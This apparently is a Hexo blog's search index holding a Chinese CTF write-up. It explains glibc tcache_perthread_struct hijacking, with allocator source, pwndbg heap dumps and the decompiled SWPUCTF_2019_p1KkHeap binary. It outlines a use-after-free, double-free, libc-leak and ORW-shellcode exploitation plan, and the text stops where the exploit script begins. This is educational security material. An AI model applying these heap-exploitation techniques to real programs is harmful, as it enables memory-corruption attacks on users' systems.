<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>不同版本下glibc有关堆的管理和保护</title>
      <link href="/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/"/>
      <url>/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<p>记录一下不同版本glibc下的堆管理保护机制的变化(开个坑，以后慢慢记录补充<br></p><p>先贴上几篇参考博客<br></p><p><a href="https://nopnoping.github.io/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">不同版本glibc的堆管理和新增保护机制 - Luexp</a><br><a href="https://jkilopu.github.io/2021/05/12/glibc%E5%90%84%E7%89%88%E6%9C%AC%E7%9A%84%E5%A0%86%E4%BF%9D%E6%8A%A4/">glibc各版本的堆保护 | jkilopu’s blog</a><br><a href="https://s0fr.github.io/2020/05/10/libc230/">Glibc中堆管理的变化 | 白里个白</a><br><a href="https://www.cnblogs.com/LynneHuan/p/17822172.html">Glibc高版本堆利用方法总结 - LynneHuan - 博客园</a><br></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>劫持tcache_perthread_struct</title>
      <link href="/2025/07/04/%E5%8A%AB%E6%8C%81tcache-perthread-struct/"/>
      <url>/2025/07/04/%E5%8A%AB%E6%8C%81tcache-perthread-struct/</url>
      
        <content type="html"><![CDATA[<h2 id="关于tcache-perthread-struct"><a href="#关于tcache-perthread-struct" class="headerlink" title="关于tcache_perthread_struct"></a>关于tcache_perthread_struct</h2><p>tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能，与 fastbin 类似。 tcache 引入了两个新的结构体， tcache_entry 和 tcache_perthread_struct 。<br>两个结构体源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];<span class="comment">//0x40</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">//0x40</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TCACHE_MAX_BINS:</span><br><span class="line"># define TCACHE_MAX_BINS        64</span><br></pre></td></tr></table></figure><p>我们在引入了tcache的glibc版本中，申请第一块chunk时查看heap状态会发现多申请了一块大小0x250的chunk（高版本下为0x290，因为counts的类型从char变成了uint16_t）。这个chunk就是 tcache_perthread_struct<br>counts数组的是各个size的tcache bin中的chunk数量，而entries指针数组则存放着各个size的tcache bin中的第一个chunk的位置(fd地址而非堆头地址)<br>我们通过调试SWPUCTF_2019_p1KkHeap这道题目的程序来使其直观化<br>我们先申请了size为0x80，0x90，0xa0的三个chunk，查看heap如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01000</span><br><span class="line">Size: 0x250 (with flag bits: 0x251)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01250</span><br><span class="line">Size: 0x90 (with flag bits: 0x91)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a012e0</span><br><span class="line">Size: 0xa0 (with flag bits: 0xa1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01380</span><br><span class="line">Size: 0xb0 (with flag bits: 0xb1)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01430</span><br><span class="line">Size: 0x20bd0 (with flag bits: 0x20bd1)</span><br></pre></td></tr></table></figure><p>发现除了我们申请的三个chunk，还有一个size为0x250的chunk，正是 tcache_perthread_struct。然后我们free申请的三个chunk<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01000</span><br><span class="line">Size: 0x250 (with flag bits: 0x251)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01250</span><br><span class="line">Size: 0x90 (with flag bits: 0x91)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555a012e0</span><br><span class="line">Size: 0xa0 (with flag bits: 0xa1)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01380</span><br><span class="line">Size: 0xb0 (with flag bits: 0xb1)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01430</span><br><span class="line">Size: 0x20bd0 (with flag bits: 0x20bd1)</span><br></pre></td></tr></table></figure><p>注意这里显示的chunk地址是从堆头开始计的，也就是包括了pre_size域和size域。此时查看bins<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x90 [  1]: 0x555555a01260 ◂— 0</span><br><span class="line">0xa0 [  1]: 0x555555a012f0 ◂— 0</span><br><span class="line">0xb0 [  1]: 0x555555a01390 ◂— 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>注意bins中的chunk地址是从fd开始计的<br>三个chunk已经加入了tcachebins（大小为0x20到0x410),我们查看 tcache_perthread_struct<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80gx 0x555555a01000</span><br><span class="line">0x555555a01000: 0x0000000000000000      0x0000000000000251</span><br><span class="line">0x555555a01010: 0x0100000000000000      0x0000000000000101</span><br><span class="line">0x555555a01020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01040: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01080: 0x0000000000000000      0x0000555555a01260</span><br><span class="line">0x555555a01090: 0x0000555555a012f0      0x0000555555a01390</span><br><span class="line">0x555555a010a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a010b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a010c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a010d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a010e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a010f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01110: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01120: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01130: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01140: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01150: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01160: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01170: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01180: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01190: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01200: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01210: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01220: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01230: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01240: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>正如上示， tcache_perthread_struct的size域为0x251（含标志位），实际大小为0x555555a01000到0x555555a01240的0x250大小的一块。<br>我们先记0x555555a01000为heapbase，heapbase+0x10到heapbase+0x40这一块为counts数组，heapbase+0x50到heapbase+0x250的大小0x200（0x40*8）的一块为entries数组<br>heapbase+0x50存放大小0x20的tcachebin的第一个chunk的fd地址，heapbase+0x58存放大小0x30的tcachebin的第一个chunk的fd地址，以此类推，在heap+0x88存放的是大小0x90的tcachebin的第一个chunk的fd位置（不是fd值），即0x555555a01260，heap+0x90和heap+0x98处同理<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x555555a01080: 0x0000000000000000      0x0000555555a01260</span><br><span class="line">0x555555a01090: 0x0000555555a012f0      0x0000555555a01390</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x90 [  1]: 0x555555a01260 ◂— 0</span><br><span class="line">0xa0 [  1]: 0x555555a012f0 ◂— 0</span><br><span class="line">0xb0 [  1]: 0x555555a01390 ◂— 0</span><br></pre></td></tr></table></figure><p>而counts位置记录的chunk数量是如何索引的呢？<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40bx 0x555555a01010</span><br><span class="line">0x555555a01010: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x01</span><br><span class="line">0x555555a01018: 0x01    0x01    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x555555a01020: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x555555a01028: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x555555a01030: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br></pre></td></tr></table></figure><p>如上所示为counts数组，在counts数组为char类型的版本中（也就是此处版本），在小端序情况下，从heap+0x10处开始，按照低字节到高字节（也就是低地址到高地址）存储。如上所示（在使用x&#x2F;gx查看de时候显示出的数据会按照小端序的方式以0x8字节为单位呈现，会使得在高地址的第八个0x01被理解为高位，所以改用x&#x2F;bx查看更加直观）<br>第1字节存放大小0x20的tcachebin的chunk数量，以此类推看到第8字节，9字节，10字节都是0x01，也就是我们释放的三个chunk。</p><h2 id="漏洞利用：修改counts数组和entries指针数组"><a href="#漏洞利用：修改counts数组和entries指针数组" class="headerlink" title="漏洞利用：修改counts数组和entries指针数组"></a>漏洞利用：修改counts数组和entries指针数组</h2><p>看tcache_free函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<span class="comment">//&lt;7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>当对应大小的tcachebin中的chunk数量小于7时，会优先放入tcachebin，然而这里检查的是tcache-&gt;counts数组中的元素，也就是根据tcache_perthread_struct中的数据来判断，但却没有检查double free（在glibc2.29之后引入了key字段来防御double free，然而仍然可以绕过，关于不同版本glibc的堆管理和保护机制会再开一篇blog收集记录一下）<br></p><p>看tcache_malloc函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这里是根据tcache-&gt;entries数组的元素来索引tcachebins中的第一个chunk，同样也是根据tcache_perthread_struct中的数据来判断。<br>所以说，如果我们能够修改tcache_perthread_struct中的数据，也就能控制整个tcachebins。我们可以修改counts数组的数量，以将chunk放到我们想放置的其他bins中（比如放入unsortedbin来泄露malloc_hook，libc），也可以修改entries数组的数据来malloc任意地址。<br></p><h2 id="以SWPUCTF-2019-p1KkHeap为例"><a href="#以SWPUCTF-2019-p1KkHeap为例" class="headerlink" title="以SWPUCTF_2019_p1KkHeap为例"></a>以SWPUCTF_2019_p1KkHeap为例</h2><h3 id="复盘-tcache-perthread-struct-attack-unsortedbin-leak-uaf-double-free-orw"><a href="#复盘-tcache-perthread-struct-attack-unsortedbin-leak-uaf-double-free-orw" class="headerlink" title="复盘&#x2F;tcache_perthread_struct attack&#x2F;unsortedbin leak&#x2F;uaf&#x2F;double free&#x2F;orw"></a>复盘&#x2F;tcache_perthread_struct attack&#x2F;unsortedbin leak&#x2F;uaf&#x2F;double free&#x2F;orw</h3><p>先放源码<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_B0A();</span><br><span class="line">  v3 = <span class="string">&quot;                           Welcome to SWPUCTF 2019&quot;</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;                           Welcome to SWPUCTF 2019&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( dword_202024 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v4 = sub_1076();</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">5</span> )</span><br><span class="line">        Exit();</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt; <span class="number">5</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Delete(v3, a2);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">666</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = <span class="string">&quot;p1Kk wants a boyfriend!&quot;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;p1Kk wants a boyfriend!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Add(v3, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Show(v3, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    --dword_202024;</span><br><span class="line">  &#125;</span><br><span class="line">  Exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单，限制操作次数至多为0x12，看选项函数<br></p><p>add<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_E1E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  size = sub_1076();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x100</span> )</span><br><span class="line">    Exit();</span><br><span class="line">  v1 = sub_DA9();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    qword_202100[v1] = <span class="built_in">malloc</span>(size);</span><br><span class="line">    dword_2020E0[v1] = size;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最多申请八次堆，每次返回不同索引，size至多为0x100<br>edit<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_EC1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;id: &quot;</span>);</span><br><span class="line">  v1 = sub_1076();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7</span> )</span><br><span class="line">    Exit();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;qword_202100 + v1), dword_2020E0[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dword_2020E0数组记录了chunk大小，不能溢出<br>show<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_F58</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;id: &quot;</span>);</span><br><span class="line">  v1 = sub_1076();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7</span> )</span><br><span class="line">    Exit();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)qword_202100[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_202020 &lt;= <span class="number">0</span> )</span><br><span class="line">    Exit();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;id: &quot;</span>);</span><br><span class="line">  sub_1076();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)v0 &gt; <span class="number">7</span> )</span><br><span class="line">    Exit();</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)qword_202100[v0]);</span><br><span class="line">  dword_2020E0[v2] = <span class="number">0</span>;</span><br><span class="line">  --dword_202020;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dword_202020限制只能free三次，指针没置零。但是dword_2020E0数组对应项置零，free后无法edit，只能show。<br></p><p>那么思路就是，先泄露tcache_perthread_struct的地址，然后修改counts数组，将chunk放到unsortedbin，泄露出malloc_hook<br>我们还能注意到，程序映射了一块rwx内存位于0x66660000，可读可写可执行<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( mmap((<span class="type">void</span> *)<span class="number">0x66660000</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>) != (<span class="type">void</span> *)<span class="number">1717960704</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="type">void</span> *)<span class="number">0x66660000</span>, <span class="number">0</span>, <span class="number">0x1000u</span>LL);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)<span class="number">0x66660000</span>, <span class="string">&quot;SWPUCTF_p1Kk&quot;</span>);</span><br></pre></td></tr></table></figure><p>那么思路很清晰了，只需要向这块区域写入shellcode即可。但是写入后发现无法getshell，后来发现程序开启了沙箱。那么用shellcode进行orw即可。<br>wp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 